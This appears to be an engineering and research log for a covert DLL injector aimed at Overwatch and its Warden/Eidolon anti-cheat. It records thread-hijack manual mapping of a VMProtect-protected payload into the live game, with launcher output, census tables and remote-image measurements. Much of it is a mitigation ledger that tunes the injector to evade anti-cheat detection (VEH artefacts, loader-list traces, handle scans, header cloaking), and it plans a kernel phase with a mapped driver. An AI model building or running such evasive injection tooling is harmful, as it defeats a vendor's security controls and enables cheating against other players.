- **The transcript is always written**, whether the run succeeded or failed. The record of
  a successful load is the one worth having. `[General] DiscardResultLogOnSuccess` removes
  it, and only after a load that actually completed - a run that failed *or was cancelled*
  always keeps its transcript, because the exit code is zero for a cancelled run and that
  is not the same thing as a successful load.
- **The transcript is written before the scratch target is closed.** The scratch target is
  closed by a guard that is a local of the wizard, so it is destroyed after the wizard
  returns. Writing the transcript at the end of the wizard means a failure while the target
  is being closed can no longer take the record of the run with it.
- **The log's name no longer depends on the configuration being readable.** When the
  configuration cannot be found or decrypted there is no configuration to take a name
  from, and the name of the launcher itself is used instead - a run that failed to find its
  configuration is exactly the run that has to be read afterwards.
- **Auto-confirm survives elevation.** The confirmation is answered from the
  configuration file, not from an environment variable, because the launcher runs elevated
  and an elevated process does not inherit its parent's environment. An environment
  variable set on the command line was never seen by the launcher at all.

## F4h. NEW (2026-10-21) â€” the shipped release, built and protected, verified end to end

The full production pipeline was run on this host: `Build\Executors\Create.bat`, then
`Build\Executors\Protect.bat`. The artefacts that came out of it:

| Artefact | Size | Notes |
|----------|------|-------|
| `mXH4RLFhw.exe` | 2.96 MB | Launcher, VMProtect-virtualized, all eleven PE mutations applied, export names shuffled |
| `IXmzNTMV\hsIm0NF45Tr.dll` | 564 KB | Runtime, deliberately left unvirtualized (it is manual-mapped) |
| `IXmzNTMV\rPzLQ42OW.dll` | 15.8 MB | The real payload, VMProtect-protected |
| `SQYDDqI9.ini` | 2.4 KB | Configuration, DPAPI-encrypted under a per-build magic |

Every gate in the pipeline passed: the merged-shell check, the 14-export shuffle, the
embedded runtime hash, the syscall-stub prologues, the payload keystream mixer, the W^X
protect sequences, and the per-build config keys.

**The protected launcher was then run against notepad, four times, and passed the
verification gate every time.** The numbers that matter, all read back during the run:

```
Return Code............... 0x00000000 (INJ_ERR_SUCCESS)
DllMain(DLL_PROCESS_ATTACH) Returned True
TLS Callbacks............. 1 Executed Of 1 Configured (0 Failed)
Loader Lock Acquire/Release  0x00000000 / 0x00000000
Thread Hijack............. TID 0x5F7C | Success = 1 | 40 Poll(s) Over 969 ms
Hijacked Stack Scrubbed... 11128 Bytes In 65185556 Cycles
Data Directories Wiped.... Cleaned Mask = 0x00000222 | Residual = 0x00000000 | Mapper Re-Read Verified
W^X....................... RWX Regions Found: 0 (Enforced)
Verification Gate......... Pass
```

So the *real* payload, virtualized launcher and all, maps cleanly into a live process,
initialises, runs its TLS callback, comes back with the thread context restored, and
leaves no writable-executable page behind. The scratch target was started by the launcher
and closed by it afterwards; the temporary copy of the launcher removed itself.

**What this does not establish:** the target was notepad, not Overwatch. The structural
claims that depend on the game â€” the single import, the 76 exports, the 3 TLS callbacks,
the 894/895 region pairing â€” are from the earlier `Overwatch.exe` run and were not
re-measured here. What this establishes is that the *shipped, protected* build does the
load correctly, and that the machinery around it is sound.

## F5. Re-verify per build (expanded)

**Closed on this build by the 2026-10-15 run (F1a):** target import count (**1**, OP shape),
export count (**94/76**), exe TLS count (**3**), target VEH existence (**yes**), CFG policy
(**off**). Anything below marked ~~struck~~ is done for *this* build only â€” it all goes stale
again next patch.

1. ~~Target import count~~ â†’ **1 descriptor** (F1a)
2. ~~Target export count~~ â†’ **94 funcs / 76 names** (F1a)
3. ~~Exe TLS callback count~~ â†’ **3** (F1a)
4. ~~Load-config vs CFG policy~~ â†’ **CLOSED 2026-10-21.** The suite now reads the exe's own
   `IMAGE_LOAD_CONFIG_DIRECTORY64.GuardFlags` (x64 offset `0x90`) in the same run and prints
   it next to the `enable 0 strict 0` policy, so D6a reading A vs B is decidable from one
   run. **Still to be read off a live build.**
5. ~~The 906 `PAGE_NOACCESS` regions (18 MB) â€” filter by address range~~ â†’ **CLOSED 2026-10-21
   by E1a: they were always inside the main image.** The census now walks the whole address
   space and reports the in-image / free-space split explicitly, so the scope can no longer
   be misread.
6. ~~`0xCC` census scoped per module~~ â†’ **CLOSED 2026-10-21: it was always per-module.**
   The report now names the range it was measured over.
7. Loader decoy-import count â€” 31 / 13 / 41 across the OP's own three statements. **MEASURED 2026-10-25: 37 descriptor(s), first KERNEL32.dll** (read from the loader's remote image; `Imports:` row, live PID 15924). None of the OP's three numbers match; the count is now per-run data.
8. The global pointer table (`0x4ACxxx` family) â€” present? populated? in which image?
9. Eidolon XOR entry RVA â€” expect it to have moved again (C2: moved twice in 2025).
10. The five unclassified strings â€” find a **consumer**, or retire them (D11).
11. ~~Which DLL and which function is the single import?~~ â†’ **CLOSED 2026-10-21.** The suite
    now reads the import descriptor's name and its first named import out of the remote
    image and prints both, so the Â§1 confirmation is total rather than partial. **Still to
    be read off a live build.**
12. Whether the 3 TLS callbacks are still PEB-guard / VEH-register / thread-setup. Count
    confirmed, roles not.
13. Crash-callback hash block â€” single-session observation, not a constant.
14. Is Eidolon present at all next patch? It was reportedly **removed** once (thread 679641)
    and Blizzard **reverted** to prior encryption in 2024 (C4). The single-import read is the
    cheapest live proxy for this.
15. **The region-shape lead (E1a)** â€” 894 executable regions and 895 no-access regions inside
    one image, paired almost one to one. Settle it the way AutoDump does: find the touch
    gadget (`48 8B 01 C3`) in the loader and watch a no-access page become readable.
    **Counted 2026-10-25 (live PID 15924): 15 hit(s) in `Overwatch.exe`'s sampled exec
    regions, 1 in the loader's** - the pattern exists in both images; the next step is
    correlating a hit address with a no-access page turning readable. Fourth session
    pairing: 912/913.

---

# PART F2 - The real census of `Overwatch.exe` (2026-10-21, two runs: PIDs 23184 and 6924)

This is the first run of the corrected survey against the actual target, and it closes most
of what was open. The figures below are read back from a successful load, not inferred. The
census was then run again against a second game process, and reproduced - see F2c-2.
## F2a. The single import, named

```
[+] Target Imports.......... 1 Descriptor(s) In Overwatch.exe (Read Back)
    Overwatch_loader.dll!Ordinal 1
    [*] Single-Import Shape: Every Call This Image Makes Leaves Through One Imported Module.
```

**The module name is confirmed exactly: `Overwatch_loader.dll`.** The function is imported
**by ordinal 1**, not by name - so the OP's `eidolon_run` is a name he resolved separately,
not the import name. That is consistent with C4, which reported the game calling the
ordinal-1 export through an internal `Overwatch_loader_1()` wrapper.

## F2b. The encrypted core, located structurally

```
Encrypted 1 Region(s) / 4672 KB Inside A Loader's Encrypted Core - Never Read
         Overwatch_loader.dll -> .eid @ 00007FFB64280000..00007FFB64710000

Overwatch_loader.dll....   (Encrypted-Core Carrier)
    Regions:.... 11 Committed | 1 Executable | 0 No-Access | 0 Guard | 1 Encrypted-Core
    INT3:....... 86833 Of 30801920 Sampled Bytes Are INT3 (0xCC), 0%, From 1 Of 1 Executable Region(s)
```

The `.eid` section was found **by structure, not by name**, and its extent is **4,672 KB**.
The OP said ".eid ... 4.2 mb" and "4.25 mb"; the measured virtual extent is 4.56 MB, which is
the same thing within the difference between a raw size and a virtual size. The section was
**never read** - it is counted and located, and left alone.

**This closes the loader-side survey gap** (G4, F3 MED): the loader is now identified as the
encrypted-core carrier, its module range is censused, and its single executable region is
30.8 MB of code.

## F2c. E1 answered, with the in-image / free-space split

```
Scope  146 Module(s) Loaded | Main Image = Overwatch.exe @ 00007FF686A20000 | 73952 KB
Walk    33636 Committed Region(s) Walked | 170 Guard | 14202 No-Access | 1164 Executable
By Range  Inside Module Images.. Guard 0 | No-Access 900 | Executable 1045 | Committed 2890
By Range  Free Address Space.... Guard 170 | No-Access 13302 | Executable 119 | Committed 30745

Overwatch.exe...........   (Main Image)
    Regions:.... 1904 Committed | 899 Executable | 900 No-Access | 0 Guard | 0 Encrypted-Core
    INT3:....... 1195525 Of 31084544 Sampled Bytes Are INT3 (0xCC), 3%, From 899 Of 899 Executable Region(s)
```

**E1's question is answered, and the answer is the interesting one.** Of the **14,202**
no-access regions in the process, **900 are inside the module images** and **13,302 are in
free address space**. The count that matters is the 900.

`Overwatch.exe` alone has **899 executable regions and 900 no-access regions inside its own
image** - the near one-to-one pairing that Part E predicted and then failed to find. A
normal image has one to three executable regions. This is the demand-paging shape, and it is
now measured on the real target rather than argued from a mislabelled count.

### F2c-2. Reproduced on a second game process

A second run, against a different `Overwatch.exe` process, reproduced every structural
figure and the shape with it:

| Measurement | Run 1 (PID 23184) | Run 2 (PID 6924) |
|-------------|-------------------|-------------------|
| import descriptor | 1, `Overwatch_loader.dll!Ordinal 1` | **1, `Overwatch_loader.dll!Ordinal 1`** |
| exports | 94 funcs / 76 names | **94 / 76** |
| TLS callbacks | 3 | **3** |
| `GuardFlags` | `0x00000100`, load config 320 | **`0x00000100`, load config 320** |
| CFG policy | `enable 0, strict 0` | **`enable 0, strict 0`** |
| modules loaded | 146 | **146** |
| main image size | 73,952 KB | **73,952 KB** |
| `.eid` extent | 4,672 KB | **4,672 KB** |
| loader executable region | 1, 30,801,920 bytes | **1, 30,801,920 bytes** |
| `Overwatch.exe` executable regions | 899 | **884** |
| `Overwatch.exe` no-access regions | 900 | **885** |
| `Overwatch.exe` `0xCC` bytes | 1,195,525 / 31,084,544 | **1,246,267 / 32,051,200** |

**The absolute counts move and the shape does not.** The region counts and the `0xCC`
total are a function of how much the game has paged in, and they differ between two
processes. The *ratio* does not: executable regions and no-access regions inside
`Overwatch.exe`'s own image are 899/900 and 884/885. Both are one apart. And every
figure that describes the image rather than the session - the import, the export count, the
TLS count, the load config, the `.eid` extent, the loader's code size - is identical to the
byte.

**That is the difference between a sample and a measurement.** A single run could have been
a coincidence of one process's state. Two runs against different processes, with the same
image reproduced exactly and the ratio reproduced to within one, is a property of the
binary.

**It is still a lead, not a conclusion.** The pairing is what C5's model predicts, and the
gadget hunt is still what would settle it. What has changed is that the discriminator is no
longer hypothetical: the in-image count is ~900, it is not a rounding error in the free
space, and it does not go away when the process changes.

## F2d. What else the run re-confirmed

| OP claim | Measurement | Verdict |
|----------|-------------|---------|
| one import | `Overwatch_loader.dll!Ordinal 1` | **CONFIRMED, and now named** |
| 76 exports | 94 funcs / 76 names | **CONFIRMED** |
| 3 TLS callbacks | 3 configured (remote array read) | **CONFIRMED** |
| `GuardFlags: 0x100` | `0x00000100`, load config 320 | **CONFIRMED exactly** - D6a |
| a VEH handler | `UsingVEH=YES`, CrossFlags `0x5` | **CONFIRMED** (existence only) |
| `.eid` encrypted core, ~4.2 MB | `Overwatch_loader.dll` `.eid`, 4,672 KB | **CONFIRMED, and located** |

**And the load itself was clean:** the payload mapped at `0x29A290000`, its `DllMain`
returned true, one TLS callback executed, the loader lock was taken and released, the data
directories were wiped with a zero residual mask, the header was cloaked with zero `MZ` and
zero `PE` remnants, and the verification gate passed with zero RWX regions.


---

# PART F6 â€” Mitigation ledger (2026-10-25)

Every usermode vector named in this file or found in the 2026-10-25 gap review, and what
became of it. "Fixed" means the code changed; "measured" means the suite now reports it
dynamically; "recorded" means it is a known trade that this file owns.

| # | Vector | Status | What changed |
|---|--------|--------|--------------|
| F1c | Target handle rights | **Fixed** | `0x1010` standing handle, opened first; `0x0410` only on a refused census probe; the posture is reported by construction and verified by the census probe on the opened handle (an NtQueryObject mask readback was tried and could not be relied on - removed); the debug-port refusal is named as the posture, not an unknown fault. |
| F3 | Overlay/input surfaces | **Fixed + measured** | Confirmation uses **two channels, chosen at runtime**: when a console is attached (a direct, non-polymorphic launch) the console input buffer is read (scan codes; no session key-state reads); when there is no console â€” the normal flow, because the polymorphic child is created with `CREATE_NO_WINDOW` â€” the session key state is read, which is the console-less mechanism the architecture requires. The transcript names the channel used. (Measured the hard way on 2026-10-25 at 08:07: a console-only check aborted the live run at the confirmation phase in 93 ms.) The payload's own surface is *measured*: target-owned top-level windows and layered/transparent styles are counted before the load and after it, and the delta is printed (`Payload Window Surface`, `+N` â€” notepad runs measured both +1 and +0). DWM/clipboard internals of the payload remain payload-side. |
| F4/C5 | VEH chain artefact | **Fixed (two mechanisms), regression measured** | The payload's `OutputDebugStringA/W` imports are redirected to a bare `ret` in ntdll (its own logging never raises), **and** a first-chance VEH guards the shell window for dependency-internal ODS â€” the redirect alone was measured killing a bare notepad with exit code `0x40010006` (`DBG_PRINTEXCEPTION_C`) when the shell loaded `D3DCOMPILER_47`. Both mechanisms report through one packed telemetry field; the failure hint names the exit code. |
| F4 | TLS loader mutation | **Fixed (conditional) + measured** | A TLS directory with no callbacks and no data skips the loader entirely (no LDR entry, no PEB bit, no heap churn); the skip prints through the "no loader entry" telemetry. Images with data keep the by-design retention. |
| F4 | First-chance gap | **Fixed (fallback) + recorded** | The inverted-function-table fallback (the `.mrdata` write) is removed; `RtlAddFunctionTable` is the only path and fails closed. The gap itself is recorded as invariant to the flag (Warden's VEH is first-chance either way). |
| F3 | Pagefile signal | **Measured** | New host-surface step reports physical memory, commit limit, and the no-pagefile-VM tell verdict from `GlobalMemoryStatusEx` â€” the same numbers the target reads. |
| F3 | CPUID leaves | **Measured** | Vendor string and leaf-1 hypervisor bit reported dynamically (C3's spoofing checklist item). |
| F3 | `\BaseNamedObjects` scan | **Measured** | This process's own kernel objects are enumerated by type and name-checked: Events/Sections/Mutants counts with named counts â€” all-unnamed is the design, and the count proves it per run. MDL-backed shared memory remains outside usermode reach (recorded, not fixable from here). |
| F3 | WINTRUST/sfc | **Recorded** | Target-side integrity scope; no injector-side surface. Unchanged. |
| G4 | Loader un-surveyed | **Measured** | The census now reads the loader's remote image: import descriptor count with the first module name, TLS callback count, and the demand-paging touch gadget (`48 8B 01 C3`) hit count in its sampled executable regions. G4's remaining gap is the loader's VEH attribution, which needs the chain walk D9 calls contested. |
| B1 | Mapped image = private-RX signature | **Measured + recorded** | Inherent to manual mapping. The VAD census now attributes by address range: "N private-RX process-wide: M belong to this load's image @ base, K pre-existing in the target." The fresh-game baseline of 2 own private-RX regions is recorded above (F1b correction). |
  **Session-state observation (2026-10-25, PID 2760):** the pre-existing share is not a
  constant - a fresh game instance carried 2 own private-RX regions, a lived-in session
  carried 5. The by-range attribution is what makes the load's contribution (always 2)
  readable regardless; the raw process-wide count alone would have misattributed.
| OP Â§11.3 | Donor-thread stall timing | **Fixed (policy) + measured** | Donor preference now ranks event-driven safe waits above delay waits (a delay wait's remaining timer is unknowable; the 2026-10-24 WrUserDelay sponsor failure and the 922 ms wake of the 2026-10-25 run are both this shape). The result table reports the stall window (wall ms vs shell CPU ms at the measured TSC) with a verdict against the target's own "delta > expected Ã— 2" heuristic at 15â€“16 ms granularity. |
| A9 | Synthetic stack vs TEB bounds | **Fixed (measured 2026-10-25 08:16)** | The stub pivoted RSP onto the 1 MB shell stack but left the TEB describing the victimâ€™s stack, so `__chkstk`, the exception dispatcherâ€™s exhaustion evaluation and any first-chance handler judged stack state against the wrong region â€” the live target exited with `0xC00000FD` (`STATUS_STACK_OVERFLOW`) mid-shell (notepad survived only because it carries no first-chance VEH). 
| A10 | TLS registration via the loader | **Fixed (2026-10-25 (g))** | The stage no longer fabricates loader bookkeeping: `TlsAlloc` for the index, one heap block for the template, `TlsSetValue` for the hijacked thread's slot, the image's `_tls_index` patched to match. No `LdrpHandleTlsData`, no loader lock, no `LdrpTlsList` entry, no cross-thread template spread into threads the target creates later. Footprint: one PEB `TlsBitmap` bit, one TEB slot, one heap block. Failure unwind in `MMI_CleanUp`: index restored, block scrubbed, slot freed - each flag reported. Caveat recorded: threads the *target* creates later see slot 0 in that index, not the template copy (the loader does not know the registration); acceptable when the payload reads TLS from its own threads, to be confirmed live. |
  **LIVE 2026-10-25 (PID 9440, `Overwatch.exe`): confirmed working** - slot 76, data template installed, `LdrpTlsList` entry = none, loader lock never taken, gate Pass, DllMain True, context restored, 94 ms inject wall.
  **Design decision recorded:** an inline allocation (walking the PEB bitmap directly) was
  evaluated and rejected. Measured live, the first 64 TLS indexes are fully occupied on
  both targets (TlsAlloc returned 76 on the game, 91 on notepad), so an inline scheme
  would have to drive the loader's real `PEB->TlsBitmap` RTL_BITMAP and fabricate the
  thread's TlsExpansionSlots array - new loader internals in the most fragile stage, for
  a marginal gain. The hook-exposure argument (a target hook on `TlsAlloc` seeing a
  staging return address) does not single this call out: the shell already calls
  `LdrpLoadDllInternal`, `LdrGetProcedureAddress` and `RtlAllocateHeap` from staging the
  same way, so the property is universal and accepted. Also fixed on this path: the
  failure unwind now restores `_tls_index` through a cached address (`TlsIndexAddress`)
  because `MMI_CleanDataDirectories` zeroes the TLS directory before `MMI_CleanUp` runs
  on a post-cloak failure path - the unwind must not depend on a wiped struct.

  **USERMODE PHASE CLOSED (2026-10-25).** The final re-sweep found no remaining
  eliminable in-target vector: the mapped image (B1), the PEB bitmap bit + TEB slot
  (functional minimum), the behavioral quanta, the donor stall on waiting donors, the
  launcher's own handle footprint, and the dependency-load notifications are all recorded
  as inherent or accepted with their measurements. The verification-handle report now
  states the posture by construction and probe rather than by a mask readback that could
  not be relied on. What remains is the kernel board: handle-table scans, kernel ETW
  providers, MDL-backed shared memory, IOCTL driver probing, and the JAM payload
  functions.
| A3/C5 | VEH-guard window | **Accepted residual** | The first-chance guard points into the staging for the shell's duration (measured 4.5-450 ms across the 2026-10-25 runs). Narrowing it to just the import+DllMain stages was evaluated and rejected: the remaining stages cost ~1 ms and the change adds fail-path risk for no measurable gain. |
| B1 | Working-set / commit quanta | **Inherent, recorded** | ~19-25 MB commit appears in under a second with no loader event; the page-fault delta rides with it. No usermode mitigation exists - the image has to live somewhere. |
| B4 | Launcher handle footprint | **Minimized, residual inherent** | The launcher's own handles on the target during the run (verification handle `0x1010`, sponsor thread handle at `INJ_THREAD_HIJACK_ACCESS`) are visible to a kernel-level handle-table scan; the elevation that shields the launcher's modules from a medium-IL game does not shield its handles. Working-set probes now cost zero handles (system snapshot), the census is opt-in, and the masks are minimal - but any in-process operator at all is visible at this layer. Kernel-phase item. |
| B3 | Dependencies in the loader list | **Measured (live)** | A pre-load module baseline is captured at selection (one transient snapshot); the census diffs it afterwards and prints `Loader-List Delta: +N` with the names. **Live 2026-10-25 (PID 15924): +3 â€” `inputhost.dll`, `xinput1_4.dll`, `D3DCOMPILER_47.dll`** â€” the trace is real on the game, not only on a bare notepad (+7..+16 there); the names are printed per run. **Accepted residual:** any in-proc monitor registered via `LdrRegisterDllNotification` receives a callback the moment `LdrpLoadDllInternal` maps each dependency - no polling needed - and kernel ETW Image-Load providers see the same. The only usermode mitigation (manual-mapping the dependencies) trades loader-list entries for more private-region clusters, strictly worse under B1; the notification question is a live test for the kernel phase. |
| B4 | Launcher handle footprint | **Fixed** | Candidate working sets come from one `NtQuerySystemInformation` snapshot â€” zero handles opened on candidates (was: `0x0410` per candidate). The runtime's thread census (one open per target thread, diagnostic-only) is gated behind `AMEGER_CENSUS`, which the launcher sets only for verbose/full-census runs; a quiet run opens no target thread for it. The sponsor pre-open keeps its minimal `INJ_THREAD_HIJACK_ACCESS` (required). |
| B5 | Transcript breaks polymorphism | **Fixed** | The transcript name is random per run (same generator shape as the launcher's own), so no stable-name artifact links runs. Still always written; failed runs still keep it. |
| B6 | Symbol infrastructure | **Recorded + fixed (bug)** | Machine-wide store persists by design (one download per machine beats one per run) and is now reported (file count/size). The scratch-dir NUL bug (`kAlphabet` modulo) that leaked un-deletable scratch directories ~13% of runs is fixed with a guarded constant. |
| B7 | Untracked remote residue | **Fixed** | Rolled-back pending timeouts reclaim everything host-side (image scrubbed+freed, staging freed, duplicated event handle closed in the target) and retry the next donor. The deferred-trampoline reaper now also *rewinds* never-started stubs (state Pending, RIP at the entry, RSP untouched â€” the saved RSP and return target are in the state page) and frees the 1 MB+ allocation instead of carrying it forever. `SR_HT_ERR_RECOVERY_REQUIRED` keeps the conservative hand-off (that donor may still be inside the stub), and the retained allocation is reported in map stats. |
| B8 | Self-copy crash window | **Fixed** | The retry path deletes its own copy before `TerminateProcess` (previously the copy outlived a terminated parent and relied on the child); the child's parent-path deletion remains as backup. |
| G2 | "JAM payload functions" | **Open** | Still the biggest unknown; nothing new to add. |
| F5/15 | Touch-gadget hunt | **Partially measured** | The census counts `48 8B 01 C3` candidates in the loader's executable region per run; correlating a hit with a no-access page turning readable (the AutoDump experiment) is the next step and needs the live target. |

The verification suite gained one step (`Survey Host Surface`) and dynamic rows in five
others; every new line prints a measured value with its verdict computed from the
measurement, in the suite's existing template. The build pipeline's gates all pass on the
changed runtime (syscall prologues, indirect tails, W^X sequences, merged shell, export
shuffle, embedded hash).

---

# PART G â€” Open questions

1. ~~Is Part E true?~~ â€” **NO. Retracted** (E0). Our runtime census measured 1,199,181 `0xCC`
   bytes, not 0. D6's "CFG" attribution is dead too; the likely truth is ordinary MSVC padding.
2. **What are the "JAM payload functions"?** (`str4ever1`, B1 #40.) The only named mechanism
   for out-of-image Warden modules. Nobody has located them. **Still the biggest open gap.**
3. **Is the thread OP genuine or fabricated?** (B4.) **Materially weakened for the structural
   half** â€” single-import, 76 exports, and 3 TLS callbacks all reproduced independently
   (D13a). The mechanistic half is still badly wrong. A reasonable position: real
   observations, largely wrong explanations, and a disputed provenance.
4. **Where does Warden live on the current build?** (B1) `betsit` self-identifies as Blizzard.
   Still unresolved, but our coverage is much better than it was: the loader is now
   identified, censused and located by its encrypted core (F2b), and since 2026-10-25 its
   import descriptors, TLS callback count and touch-gadget candidates are read per run
   (F6). What is still missing is the loader's *VEH attribution* - which handler in the
   chain belongs to it - and that needs the chain walk D9 calls contested.
5. ~~What are the 906 `PAGE_NOACCESS` regions?~~ - **CLOSED (E1a, F2c).** They are inside the
   main image: 900 of them, against 899 executable regions in the same image, with
   13,302 more in free address space. The census now reports the split, and the
   loader is located by its encrypted-core section. What the pairing *means* is still the
   open question - see F5 item 15.
6. ~~Does `GuardFlags: 0x100` reflect the build or was the OP reading the wrong field?~~
   **CLOSED (D6a, F2d).** The target's own load config says `0x00000100` and 320 bytes.
   The OP read it correctly; this file's earlier "CONTRADICTED" verdict was wrong.
7. **Are the five strings Warden modules, settings keys, or SQLite opcode names?** (D11).
   One `strings`-offset-stride check against SQLite's opcode table would settle it.
8. **Which `.eid` APIs are live on the current loader vs decoys?** (C3 lists 10; the OP's
   import table lists 13 DLLs; Â§5.4 lists 41.) The loader's `.eid` is now located and
   measured, but its contents are not read.
9. ~~Current `.eid` size, trampoline base, loader TLS count?~~ - **`.eid` size: DONE,**
   4,672 KB in `Overwatch_loader.dll` (F2b). **Loader TLS count: DONE 2026-10-25 â€” 2
   callbacks** (`TLS:` row, remote array read, live PID 15924). The trampoline base
   (`0x4ACxxx` family) is still not measured.
10. **Is the Battle.net Identity file still 56 bytes?** Where are CPUID leaves read now? Is
    kdmapper still undetected? All single-source, all stale. **HWID family excluded by
    instruction (F4)** - listed for completeness only, no work proposed.

---

# PART H - Sources and access log


Retrieved **2026-10-15**. `unknowncheats.me` returns **HTTP 403 (Cloudflare)** to direct
`WebFetch`. Playwright MCP unusable on this host (**no Chrome/Chromium**; `npx`/node absent).
All thread bodies below were retrieved successfully through a reader proxy.

**Full thread bodies retrieved (NEW this revision â€” the previous revision had 403'd on all of
these and worked from search excerpts only):**
- `761091-eidolon-warden-analysis.html` â€” page 1, posts #1â€“20 (OP + full dispute)
- `761091-eidolon-warden-analysis-2.html` â€” page 2, posts #21â€“40
- `761091-eidolon-warden-analysis-3.html` â€” page 3 (OP mirror)
- `4700341-post1.html` â€” thread 756071 OP in full (C3)
- `4700346-post2.html` â€” 756071 reply
- `734223-emulate-eidolon.html` â€” thread 734223 in full, posts #1â€“9 (C1)
- `712669-easily-call-eidolon-xor-internal.html` â€” thread 712669 in full, posts #1â€“6 (C2)

**Search-index-visible only (bodies not retrieved):**
- `756071-overwatch_loader-dll-warden-module-analysis.html` pp. 1â€“2 (31 posts) â€” OP
  retrieved via `4700341-post1.html`; comments via index excerpts
- `639855-overwatch2-obfuscator-eidolon.html` (2024-05-31, first Eidolon sighting) (C4)
- `679641-current-anticheat.html` (Warden constant; Eidolon pushed then "removed inâ€¦",
  excerpt truncated)
- `unknowncheats.me/wiki/Overwatch` â€” **403**; baseline anti-cheat list (Warden + GuardIT)
  known only from the index

**Fetched directly and successfully:**
- `us.forums.blizzard.com/en/d2r/t/latest-patch-discussion/170167` â€” vendor statement (C6)
- `deepwiki.com/wisetek/AutoDump/4.1-eidolon-anti-tamper-bypass` â€” commit `fd0e5e2c`,
  indexed 2026-06-11 (C5)

**Cross-referenced, not retrieved:**
- AutoDump README excerpt, WoWAutoDump README excerpt, OwnedCore "Eidolon decrypt p.3",
  `changeofpace/Overwatch-Dump-Fix` + Scylla "advanced IAT search" workflow,
  `he4rtbleed/ow-deobfuscator` (2020, pre-Eidolon, historical only)

**Blizzard forum thread found incidentally (real crash telemetry, 2026-01-22)** â€”
`us.forums.blizzard.com/en/overwatch/t/my-game-always-crashes-midgame-overwatch-loaderdll/997789`.
Useful as an independent data point on loader shape:
```
Failure.Bucket : INVALID_POINTER_READ_c0000005_Overwatch_loader.dll!Unknown
00007ffe`b9ac3e0c  4c8b0c01   mov r9, qword ptr [rcx+rax]
start 00007ffe`b9870000  end 00007ffe`ba2b0000  Overwatch_loader  (export symbols)
Timestamp: Mon Nov 17 23:54:05 2025 (691BA78D)   CheckSum: 009C802D
```
Confirms a real player crash inside `Overwatch_loader.dll` at a
`mov r9,[rcx+rax]` with `rcx`/`rax` invalid, on a Nov 2025 build â€” consistent with an
obfuscated, pointer-chasing resolver. `.text` is large (`0xA40000` span), consistent with an
in-image `.eid`-scale module.

---

**Bottom line, after a live read-back of the real target (2026-10-21, `Overwatch.exe` PID 23184).**

The OP's *architectural instinct* - no useful static imports, everything resolved at runtime
through a loader-side obfuscated layer - **holds, and now has independent measurement behind
it**: one import descriptor, 76 named exports, 3 TLS callbacks, a registered VEH handler, and
now the import *named* (`Overwatch_loader.dll!Ordinal 1`) and the load configuration *read*
(`GuardFlags = 0x00000100`, load config 320 bytes - the OP's exact numbers). All of it was
read back from a live `Overwatch.exe` by a query-only survey that did not need a debugger, an
injection, or a single write to a game-backed page. The fabrication allegation (Â§B4) does not
survive that.

The OP's *explanations* mostly do not. A non-canonical value called a pointer; a
first-chance field called debugger ordering; an x86 SafeSEH field called proof of VEH-only
exception handling; CFG called 1.2M bytes of `0xCC` padding **on a build where the CFG
declaration is exact but the CFG policy is off**; and five unclassified strings called a
module system with no consumer. Its magnitudes are all build-pinned, and C2 proves the
constants move within weeks.

**And this file got one wrong too.** An earlier revision confidently deduced demand-paged
`.text` decryption from the OP's own numbers, built a downstream argument on it, and called
it the most important finding here. Our runtime census then measured the `0xCC` bytes still
present â€” 1,199,181 of them â€” and it collapsed. The lesson is the same one the OP needed and
did not learn: **a mechanism asserted from someone else's interpretation of two unscoped
numbers is not a mechanism.** Keep the measurements (D13a), drop the theories they did not
earn (D1â€“D11, and E0), and never let a real observation launder a conclusion.

**And then this file got a second one wrong, in the same shape (E1a, 2026-10-21).** It
described its own census as process-wide because the report line said so, and the report
line was wrong: the walk was bounded to the main module's image range. That mislabel
propagated into four separate claims â€” that the no-access count had no attribution, that
distinguishing in-image from free space was a cheap filter on data already collected, that
the `0xCC` census still needed per-module scoping, and that the two figures were not
comparable to the OP's. All four were wrong, and they were wrong in the direction of
*over*-claiming a gap, which is the safe direction and still not acceptable.

**The correction is not a retraction of the region shape â€” it is the promotion of it.** With
the scope right, the numbers that had been sitting unread in the same table are the most
interesting thing in the corpus: **894 executable regions and 895 no-access regions inside
one image**, paired almost one to one, where a normal PE has one to three. Part E
retracted a theory built on the `0xCC` count â€” the wrong number â€” and left the region
shape, the right number, labelled as a count with no attribution.

**The same failure mode, named once, for the third time:** a claim about *scope* that was
never checked against the code that produced it. D1â€“D11 are eleven instances of it in the
OP's post. E0 was one in our own reasoning. E1a was another. The discipline that catches
all of them is one line: **before quoting a measurement, read the code that took it.**

The open gap is unchanged and is the one nobody has closed: `str4ever1`'s **"JAM payload
functions"** â€” where Warden modules actually come from if not the image. Until someone finds
them, Â§7's module system stays a naming convention, and our next useful step is cheap and
already half-collected: filter the **906 `PAGE_NOACCESS` regions / 18 MB** by image range
(E1), and read the exe's own `GuardFlags` to settle D6a.

---

# PART K â€” Kernel phase: K0 census baseline (2026-10-25)

**Scope:** Deliverable 5 of
`.zcode/plans/plan-session_86022dd394981bf045848a7044c0e7b1.md` (`Driver/`: the mapped
WDM platform and the K0 census). This part records the crash that blocked the phase, its
root cause, the corrected contract, and the baseline procedure. It does not retroactively
bless any measurement produced by the broken build.

## K1. `--census=flt` bugcheck 0x1E â€” the FltEnumerateFilters ABI

**Dump:** `dumpflt.dmp` (2026-10-25 12:52:07), `KMODE_EXCEPTION_NOT_HANDLED (1e)`,
P1 `0xC0000005` (write), P2 `0xfffff8035a91a254` = `FLTMGR!FltEnumerateFilters+0x144`,
P3 = 1, P4 = 0, process `KernelCtl.exe`. Failure bucket
`AV_W_FLTMGR!FltEnumerateFilters`. The console run that produced it is the
`--census=flt` invocation after the `notify`, `obp`, and `obt` runs.

**What the function expects.** `fltkernel.h` and Microsoft Learn:

```c
NTSTATUS FLTAPI FltEnumerateFilters(
    PFLT_FILTER *FilterList,
    ULONG        FilterListSize,        // elements, not bytes
    PULONG       NumberFiltersReturned);
```

The driver declared a **two-argument** pointer:

```c
typedef NTSTATUS (* PAMEGER_FLT_ENUMERATE)(void **FilterList, PULONG FilterCount);
...
status = enumerate(list, &count);
```

On x64 that is `rcx = list`, `edx = low 32 bits of &count`, and **`r8` is left
uninitialized**. The dump's disassembly shows the parameter mapping at the entry
(`mov r12, rcx` / `mov ebp, edx` / `mov rsi, r8`) and the two fault sites: the array store
`mov [r12+rbx*8], rsi` at `+0x144`, and the returned-count store `mov [rsi], ebx` at
`+0x1d6`. The earlier attempt that passed `NULL` as the list together with the garbage
`&count` as the size wrote through `[0+index*8]` and produced the `+0x144` fault at address
0; the later "real list" attempt still wrote the count through the uninitialized R8. Both
are the same missing argument. The note in the old source that "there is no NULL count-query
mode" was a misdiagnosis: the documented `(NULL, 0, &count)` form is valid.

**Fix (`Driver/Source/Census.c`).**
